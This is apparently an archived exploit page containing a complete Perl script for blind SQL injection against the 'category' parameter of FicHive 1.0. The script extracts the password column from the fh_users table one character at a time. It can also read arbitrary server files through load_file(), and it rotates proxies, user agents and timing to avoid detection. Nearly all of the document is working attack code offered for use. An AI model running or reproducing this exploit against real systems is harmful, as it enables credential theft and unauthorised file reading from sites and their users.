<html><head><title>FicHive 1.0 (category) Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#Usage: ./test.pl -url &quot;http://localhost/[script_path]/index.php?go=Fiction&amp;category=&lt;valide_id&gt;
#############################################################################
use LWP::UserAgent;
use Getopt::Long;
use IO::Handle;
use strict;
$| = 1;


###############################################################################
my $default_debug = 0;
my $default_length = 13;
my $default_method = &quot;GET&quot;;
my $default_time = 0;
my $version = &quot;1.1&quot;;
my $default_useragent = &quot;bsqlbf $version&quot;;
my $default_dict = &quot;dict.txt&quot;;
my $default_sql = &quot;fh_users.upass&quot;;
my $default_blind =&quot;category&quot;;
my $default_match =&quot;Genre: All/Genre:&quot;;
###############################################################################


$| = 1;

my ($args, $abc, $solution);
my ($string, $char, @dic);
my (%vars, @varsb);
my ($lastvar, $lastval);
my ($scheme, $authority, $path, $query, $fragment);
my $hits = 0; 
my $usedict = 0; 
my $amatch = 0;
my ($ua,$req);

###############################################################################
# Define GetOpt:
my ($url, $sql, $time, $rtime, $match, $uagent, $charset, $debug);
my ($proxy, $proxy_user, $proxy_pass,$rproxy, $ruagent); 
my ($dict, $start, $length, $method, $cookie,$blind);
my ($help, $bincharset, $get, $nodict);

my $options = GetOptions (
  'help!'            =&gt; \$help, 
  'url=s'            =&gt; \$url,
  'get=s'            =&gt; \$get,
  'sql=s'            =&gt; \$sql,
  'blind=s'          =&gt; \$blind,
  'match=s'          =&gt; \$match,
  'charset=s'        =&gt; \$charset,
  'start=s'          =&gt; \$start,
  'length=s'         =&gt; \$length,
  'dict=s'           =&gt; \$dict,
  'method=s'	     =&gt; \$method,
  'uagent=s'	     =&gt; \$uagent,
  'ruagent=s'	     =&gt; \$ruagent,
  'cookie=s'	     =&gt; \$cookie,
  'proxy=s'          =&gt; \$proxy,
  'proxy_user=s'     =&gt; \$proxy_user,
  'proxy_pass=s'     =&gt; \$proxy_pass,
  'rproxy=s'         =&gt; \$rproxy,
  'debug!'           =&gt; \$debug, 
  'rtime=s'          =&gt; \$rtime, 
  'time=i'           =&gt; \$time );

&amp;help unless ($url);
&amp;help if $help eq 1;

#########################################################################
# Default Options.
$abc              = charset();
$uagent         ||= $default_useragent; 
$debug          ||= $default_debug; 
$length         ||= $default_length; 
$solution       ||= $start;
$method         ||= $default_method;
$sql            ||= $default_sql;
$time           ||= $default_time;
$blind          ||= $default_blind;
$match          ||= $default_match;


&amp;createlwp();
&amp;parseurl();

if ( ! defined($blind)) {
		$lastvar = $varsb[$#varsb];
		$lastval = $vars{$lastvar};
} else {
		$lastvar = $blind;
		$lastval = $vars{$blind};
}

if (defined($cookie)) { &amp;cookie() }



&amp;banner();
&amp;httpintro();


 
if ( ! $get) { &amp;sqlget() } else { &amp;fileget() }


sub fileget {
#ord(MID(compress(load_file(0xfilename)),1,1))
	$get =~ m,.*/(.*),;
	my $lget = $1;
	my $rsize = $start + 1;
	if (-e &quot;$lget&quot; &amp;&amp; ! $start) { 
		$rsize = -s &quot;$lget&quot;;
		print &quot;Error: file ./$lget exists.\n&quot;; 
		print &quot;You can erase or resume it with: -start $rsize\n&quot;;
		exit 1
	}
	my ($fstr,$i);
	my $fsize = &quot;&quot;;
 	$fstr = unpack(&quot;H*&quot;,&quot;$get&quot;);
	# GET size of file.
	$abc = &quot;0123456789&quot;;
	for ($i=1;$i&lt;=15;$i++) {
		my $furl;
		my $find = 0;
		foreach (split/ */,$abc) {
			$find = 0; 
			$char = ord();
			$string = &quot; and mid(length(load_file(0x$fstr)),$i,1)=char($char)&quot;;
			if (lc($method) eq &quot;post&quot;) {
				$vars{$lastvar} = $lastval . $string;
			}
			$furl = $url;
			$furl =~ s/($lastvar=$lastval)/$1$string/;
			&amp;createlwp if $rproxy || $ruagent;
			my $html=fetch(&quot;$furl&quot;);
			$hits++;
	    		foreach (split(/\n/,$html)) {
 				if (/\Q$match\E/) { 
				    my $asc=chr($char);
				    $fsize .= $asc;
				    $find = 1;
				 }
				last if $find == 1;
   	 		}
			last if $find == 1;
		}
		last if $find == 0;
	}
	if ($fsize &lt; &quot;1&quot;) { print &quot;Error: file not found, no permissions or ... who knows\n&quot;; exit 1 }
	# starting ..
	$length = &quot;$fsize bytes&quot;;
	$abc = &quot;getfile [256]&quot;;
	$sql = &quot;load_file($get)&quot;;
	&amp;bsqlintro();
	# Get file
	open FILE, &quot;&gt;&gt;$lget&quot;;
	FILE-&gt;autoflush(1);
	print &quot;\n--- BEGIN ---\n&quot;;
	my ($i,$b,$fcontent);
	$rsize = 1 if $rsize &lt; 1;
	for ($i=$rsize;$i&lt;=$fsize+1;$i++) {
		my $find = 0;
		my ($furl, $b_start, $b_end, $z);
		for ($z=0;$z&lt;272;$z+=16) {
			my $zz = $z + 16;
	$string = &quot; and ord(mid(load_file(0x$fstr),$i,1))&gt;=$z and ord(mid(load_file(0x$fstr),$i,1))&lt;=$zz&quot;;
			if (lc($method) eq &quot;post&quot;) {
				$vars{$lastvar} = $lastval . $string;
			}
			$furl = $url;
			$furl =~ s/($lastvar=$lastval)/$1$string/;
			&amp;createlwp if $rproxy || $ruagent;
			my $html=fetch(&quot;$furl&quot;);
			$hits++;
			foreach (split(/\n/,$html)) {
 				if (/\Q$match\E/) { 
					$b_start = $z;
					$b_end = $z + 16;
					$find = 1;
				}
				last if $find == 1;
   			}
			last if $find == 1;
		}
		print &quot;$fcontent&quot;;	
		for ($b=$b_start;$b&lt;=$b_end;$b++) {
			$find = 0; 
			$string = &quot; and mid(load_file(0x$fstr),$i,1)=char($b)&quot;;
			if (lc($method) eq &quot;post&quot;) {
				$vars{$lastvar} = $lastval . $string;
			}
			$furl = $url;
			$furl =~ s/($lastvar=$lastval)/$1$string/;
			&amp;createlwp if $rproxy || $ruagent;
			my $html=fetch(&quot;$furl&quot;);
			$hits++;
	    		foreach (split(/\n/,$html)) {
 				if (/\Q$match\E/) { 
				    $fcontent = pack(&quot;C*&quot;,&quot;$b&quot;);
			   	    print FILE &quot;$fcontent&quot;;
				    $find = 1;
				 }
				last if $find == 1;
   	 		}
			last if $find == 1;
		}
 	}
	print &quot;\n--- END ---\n&quot;;
        close FILE;
	$solution = &quot;success&quot;;
}



sub sqlget {
	&amp;bsqlintro();
	$dict ||= $default_dict;
	open DICT,&quot;$dict&quot;;  @dic=&lt;DICT&gt;; close DICT;
	my $i;
	$nodict = 0;
	for ($i=length($start)+1;$i&lt;=$length;$i++) {
		my $furl;
		my $find = 0;
		$abc = charset();
		&amp;bsqlintro if $debug == 1;
   		print &quot;\r trying: $solution &quot;;
		foreach (split/ */,$abc) {
			$find = 0; 
			$char = ord();
			$string = &quot; AND MID($sql,$i,1)=CHAR($char)&quot;;
			    if (lc($method) eq &quot;post&quot;) {
				   $vars{$lastvar} = $lastval . $string;
				}
	    		print &quot;\x08$_&quot;;
			$furl = $url;
			$furl =~ s/($lastvar=$lastval)/$1$string/;
			&amp;createlwp if $rproxy || $ruagent;
			my $html=fetch(&quot;$furl&quot;);
			$hits++;
	    		foreach (split(/\n/,$html)) {
 				if (/\Q$match\E/) { 
				    my $asc=chr($char);
				    $solution .= $asc;
				    $find = 1;
				 }
				last if $find == 1;
   	 		}
			last if $find == 1;
		}
		if ($usedict ne 0 &amp;&amp; $find eq 0) { $nodict=1; $i--; }
		if ($find eq &quot;0&quot; &amp;&amp; $usedict eq &quot;0&quot;) { last; };
	}
}

&amp;result();

#########################################################################
sub httpintro {
	my ($strcookie, $strproxy, $struagent, $strtime, $i);
	
	
	if ($ruagent) { $struagent=&quot;rnd.file:$ruagent&quot; } else { $struagent = $uagent }
	
	
	foreach (keys %vars) {
		$i++;
		
	}
	if (! $cookie) { $strcookie=&quot;(null)&quot; } else { $strcookie = $cookie; }
	
	if (! $proxy &amp;&amp; !$rproxy) { $strproxy=&quot;(null)&quot; } else { $strproxy = $proxy; }
	if ($rproxy) { $strproxy = &quot;rnd.file:$rproxy&quot; }
	
	if (! $proxy_user) { $strproxy=&quot;(null)&quot; } else { $strproxy = $proxy_user; }
 	# timing
	if (! $time &amp;&amp; !$rtime) { $strtime=&quot;0sec (default)&quot; } 
	if ( $time == 0) { $strtime=&quot;0 sec (default)&quot; } 
	if ( $time == 1) { $strtime=&quot;15 secs&quot; } 
	if ( $time == 2) { $strtime=&quot;5 mins&quot; } 
	if ($rtime) { $strtime = &quot;rnd.time:$rtime&quot; }
	
}

sub bsqlintro {
	my ($strstart, $strblind, $strlen, $strmatch, $strsql);
	
	if ($blind eq $default_blind) { $strsql = &quot;$blind (default)&quot;; } else { $strblind = $blind; }
	if (! $blind) { $strblind = &quot;(last) $lastvar&quot;; } else { $strblind = $blind; }
	
	if ($length eq $default_length) { $strlen = &quot;$length (default)&quot; } else { $strlen = $length; }
	if ($sql eq $default_sql) { $strsql = &quot;$sql (default)&quot;; } else { $strsql = $sql; }
	
	
	if ($match eq $default_match) { $strmatch = &quot;$match&quot; } else { $strmatch = &quot;$match&quot;; }
	#printf (&quot;%12s %-60s\n&quot;,&quot;$strmatch&quot;,$match);
	
	print &quot;-&quot;x80; print &quot;\n\n&quot;;
}

#########################################################################

sub createlwp {
	my $proxyc;
	&amp;getproxy;
	&amp;getuagent if $ruagent;
	LWP::Debug::level('+') if $debug gt 3;
	$ua = new LWP::UserAgent(
        cookie_jar=&gt; { file =&gt; &quot;$$.cookie&quot; }); 
	$ua-&gt;agent(&quot;$uagent&quot;);
	if (defined($proxy_user) &amp;&amp; defined($proxy_pass)) {
		my ($pscheme, $pauthority, $ppath, $pquery, $pfragment) =
		$proxy =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		$proxyc = $pscheme.&quot;://&quot;.$proxy_user.&quot;:&quot;.$proxy_pass.&quot;@&quot;.$pauthority;
	} else { $proxyc = $proxy; }
	
	$ua-&gt;proxy(['http'] =&gt; $proxyc) if $proxy;
	undef $proxy if $rproxy;
	undef $uagent if $ruagent;
}	

sub cookie {
	# Cookies check
	if ($cookie || $cookie =~ /; /) {
		foreach my $c (split /;/, $cookie) {
			my ($a,$b) = split /=/, $c;
			if ( ! $a || ! $b ) { die &quot;Wrong cookie value. Use -h for help\n&quot;; }
		}
	}
}

sub parseurl {
 ###############################################################################
 # Official Regexp to parse URI. Thank you somebody.
	($scheme, $authority, $path, $query, $fragment) =
		$url =~ m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
	# Parse args of URI into %vars and @varsb.
	foreach my $varval (split /&amp;/, $query) {
		my ($var, $val) = split /=/, $varval;
		$vars{$var} = $val;
		push(@varsb, $var);
	}
}

# Define CHARSET to use. Dictionary /// (TODO: fix ugly code)
sub charset {
	if ($hits ne 0 &amp;&amp; $nodict eq 0) {
		my (%tmp,@b,$foo); undef %tmp; undef @b; undef $abc;
		foreach my $line (@dic) {
			chomp $line; 
	   		if ($line =~ /\Q$solution\E/ &amp;&amp; $line !~ /^#/) {
				$foo = $line; $foo =~ s/\Q$solution\E//;
		 		foreach ((split/ */,$foo)) {
		  			if ($tmp{$_} ne &quot;1&quot; ) {
						$tmp{$_} = &quot;1&quot;; push (@b,$_);
					}
		 		}
			}
		}
   		 if ($#b &gt;= 0) {
			foreach my $c (@b) { $abc .=$c;}
			$usedict = $abc;
			print &quot;\nUsing a dictionary with this charset: $abc\n&quot; if $debug == 1;
		 } else {
			$abc = chardefault()
		 }
	} else {
			$abc = chardefault()
	}
	return $abc;
}

sub chardefault {
	my $tmp;
	$abc = $charset;
	if (lc($charset) eq &quot;md5&quot;) {
		$abc = &quot;abcdef0123456789\$.&quot;;
	} elsif (lc($charset) eq &quot;num&quot;) {
		$abc = &quot;0123456789&quot;;
	} elsif (lc($charset) eq &quot;all&quot; || ! $charset) {
   		$abc = &quot;abcdefghijklmnopqrstuvwxyz0123456789\$.:-_()[]{}º@=/\\|#?¿&amp;·!&lt;&gt;ñÑ&quot;;
	}
	# If a dictionary has been used before, remove chars from current charset
	if ($usedict ne 0) {
		foreach (split(/ */, $usedict)) {
			$abc =~ s/$_//;
		}
	}
	$usedict = 0;
	return $abc;
}

sub auto_match {
	  $match = fmatch(&quot;$url&quot;);
}


#########################################################################
# Show options at running:
sub banner {
	print &quot;\n // FicHive v1.0 Blind SQL injection (bsqlbf tool modified)\n&quot;;
	print &quot; // Author:His0k4\n // Contact:his0k4.hlm[at]gmail.com\n\n&quot;;
}


#########################################################################
# Get differences in HTML
sub fmatch {
 my ($ok,$rtrn);
 my ($furla, $furlb) = ($_[0], $_[0]);
 my ($html_a, $html_b);
 if (lc($method) eq &quot;get&quot;) {
	$furla =~ s/($lastvar=$lastval)/$1 AND 1=1/;
	$furlb =~ s/($lastvar=$lastval)/$1 AND 1=0/;
 	$html_a = fetch(&quot;$furla&quot;);
	$html_b = fetch(&quot;$furlb&quot;);
 } elsif (lc($method) eq &quot;post&quot;) {
   $vars{$lastvar} = $lastval . &quot; AND 1=1&quot;;
   $html_a = fetch(&quot;$furla&quot;);
   $vars{$lastvar} = $lastval . &quot; AND 1=0&quot;;
   $html_b = fetch(&quot;$furla&quot;);
   $vars{$lastvar} = $lastval;
 }
 my @h_a = split(/\n/,$html_a);
 my @h_b = split(/\n/,$html_b);
 foreach my $a (@h_a) {
	$ok = 0;
	if ($a =~ /\w/) {
   		foreach (@h_b) {
		    if ($a eq $_) {$ok = 1; }
		}
	} else { $ok = 1; }
   $rtrn = $a;
   last if $ok ne 1;
 }
 return $rtrn;
}


#########################################################################
# Fetch HTML from WWW
sub fetch {
	my $secs;
	if ($time == 0) { $secs = 0 }
	elsif ($time == 1) { $secs = 15 }
	elsif ($time == 2) { $secs = 300 }
	if ($rtime =~ /\d*-\d*/ &amp;&amp; $time == 0) {
		my ($l,$p) = $rtime =~ m/(\d+-\d+)/;
		srand; $secs = int(rand($p-$l+1))+$l;
	} elsif ($rtime =~ /\d*-\d*/ &amp;&amp; $time != 0) {
		print &quot;You can't run with -time and -rtime. See -help.\n&quot;;
		exit 1;
	}
	sleep $secs;
	
	my $res;
	if (lc($method) eq &quot;get&quot;) {
		my $fetch = $_[0];
		if ($cookie) {
			$res = $ua-&gt;get(&quot;$fetch&quot;, Cookie =&gt; &quot;$cookie&quot;);
		} elsif (!$cookie) {
			$res = $ua-&gt;get(&quot;$fetch&quot;);
		}
	} elsif (lc($method) eq &quot;post&quot;) {
		my($s, $a, $p, $q, $f) =
  	    $url=~m|^(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?|; 
		my $fetch = &quot;$s://$a&quot;.$p;
		if ($cookie) {
	    	$res = $ua-&gt;post(&quot;$fetch&quot;,\%vars, Cookie =&gt; &quot;$cookie&quot;);
		} elsif (!$cookie) {
		    $res = $ua-&gt;post(&quot;$fetch&quot;,\%vars);
		}
	} else {
		die &quot;Wrong httpd method. Use -h for help\n&quot;;
	}
	my $html = $res-&gt;content();
	return $html;
}


sub getproxy {
	if ($rproxy &amp;&amp; $proxy !~ /http/) {
		my @lproxy;
		open PROXY, $rproxy or die &quot;Can't open file: $rproxy\n&quot;;
		while(&lt;PROXY&gt;) { push(@lproxy,$_) if ! /^#/ }
		close PROXY;
		srand; my $ind = rand @lproxy;
		$proxy = $lproxy[$ind];
	} elsif ($rproxy &amp;&amp; $proxy =~ /http/)  {
		print &quot;You can't run with -proxy and -rproxy. See -help.\n&quot;;
		exit 1;
	}
}

sub getuagent {
		my @uproxy;
		open UAGENT, $ruagent or die &quot;Can't open file: $ruagent\n&quot;;
		while(&lt;UAGENT&gt;) { push(@uproxy,$_) if ! /^#/ }
		close UAGENT;
		srand; my $ind = rand @uproxy;
		$uagent = $uproxy[$ind];
		chop($uagent);
}

sub result {
	print &quot;\r results:                                  \n&quot; .
	 &quot; $sql = $solution\n&quot; if length($solution) &gt; 0; 
	print &quot; total hits: $hits\n&quot;;
}


sub help {
	&amp;banner();
	print &quot; usage: $0 -url http://localhost/path/index.php?go=Fiction&amp;category=&lt;id&gt;\n&quot;;
    exit(1);
}

# milw0rm.com [2008-05-17]</pre></html>